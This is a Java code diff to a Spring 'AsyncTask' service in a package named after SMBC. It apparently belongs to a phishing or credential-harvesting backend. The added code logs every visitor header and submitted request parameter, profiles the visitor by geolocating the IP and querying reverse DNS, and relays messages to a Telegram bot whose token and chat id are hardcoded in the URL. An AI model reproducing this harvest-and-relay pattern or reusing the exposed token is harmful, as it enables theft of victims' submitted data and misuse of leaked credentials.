@@ -6,8 +6,13 @@ import cn.hutool.core.io.file.FileAppender;
 import cn.hutool.core.util.URLUtil;
 import cn.hutool.http.Header;
 import cn.hutool.http.HttpRequest;
+import cn.hutool.json.JSONObject;
+import cn.hutool.json.JSONUtil;
+import com.kidd.smbc.Utils.CmdUtils;
+import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.scheduling.annotation.Async;
 import org.springframework.stereotype.Service;
+import org.springframework.util.StringUtils;
 
 import javax.servlet.http.HttpServletRequest;
 import java.time.Clock;
@@ -19,6 +24,12 @@ import java.util.Map;
 
 @Service
 public class AsyncTask {
+
+    private static String ipInterfaceUrl = "http://ip-api.com/json/";
+
+    @Autowired
+    private CmdUtils cmdUtils;
+
     @Async
     public void asyncWriteList(String path, List<String> contents) {
         if (!FileUtil.exist(path)) {
@@ -88,30 +99,49 @@ public class AsyncTask {
             FileUtil.newFile(path);
         }
         FileAppender fileAppender = new FileAppender(FileUtil.file(path), 1000, true);
-        fileAppender.append("================================================\n" );
-        fileAppender.append(String.format("ip : %s\n",ip));
-        fileAppender.append(String.format("url : %s\n",url));
-        fileAppender.append(String.format("dateTime : %s\n",dateTime));
-        fileAppender.append(String.format("contry : %s\n",ipfinfo));
-        fileAppender.append(String.format("rdns : %s\n",rdns));
+        fileAppender.append("================================================\n");
+        fileAppender.append(String.format("ip : %s\n", ip));
+        fileAppender.append(String.format("url : %s\n", url));
+        fileAppender.append(String.format("dateTime : %s\n", dateTime));
         Enumeration<String> headerNames = request.getHeaderNames();//获得 n个键名，放回一个Enumeration<String>类型的数据
-        while(headerNames.hasMoreElements()){//.hasMoreElements()返回的是布尔类型的数据
+        while (headerNames.hasMoreElements()) {//.hasMoreElements()返回的是布尔类型的数据
             String headerName = headerNames.nextElement();//获得键
             String headerValue = request.getHeader(headerName);//获得值
-            fileAppender.append(String.format("%s : %s\n",headerName,headerValue));
+            fileAppender.append(String.format("%s : %s\n", headerName, headerValue));
         }
-        fileAppender.append("================================================\n" );
+        if (null != request.getParameterMap()) {
+            for (String paramKey : request.getParameterMap().keySet()) {
+                if(paramKey.contains("openid")) continue;
+                String paramVale = request.getParameter(paramKey);
+                fileAppender.append(String.format("%s : %s\n", paramKey, paramVale));
+            }
+        }
+        if (StringUtils.isEmpty(ipfinfo)) {
+            ipfinfo = HttpRequest.get(ipInterfaceUrl + ip)
+                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
+                    .timeout(20000)//超时，毫秒
+                    .execute()
+                    .body();
+
+        }
+        if (StringUtils.isEmpty(rdns)) {
+            //2、校验rdns
+            rdns = cmdUtils.queryRdns(ip);
+        }
+        fileAppender.append(String.format("contry : %s\n", ipfinfo));
+        fileAppender.append(String.format("rdns : %s\n", rdns));
+        fileAppender.append("================================================\n");
         fileAppender.flush();
     }
 
     @Async
-    public void asyncSendTgMsg(String groupId,String botToken,Map<String, String>map){
-        String msg="";
+    public void asyncSendTgMsg(String groupId, String botToken, Map<String, String> map) {
+        String msg = "";
         for (String key : map.keySet()) {
-            msg+=(String.format("%s : %s\n", key, map.get(key)));
+            msg += (String.format("%s : %s\n", key, map.get(key)));
         }
         String template = "https://api.telegram.org/bot1512174079:AAFc1hgPXsBQaTYHhXeRo25_an8tP-1eEkA/sendMessage?chat_id=-401293491&text=%s";
-        String url = String.format(template,URLUtil.encode(msg));
+        String url = String.format(template, URLUtil.encode(msg));
         String result = HttpRequest.get(url)
                 .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
                 .timeout(20000)//超时，毫秒
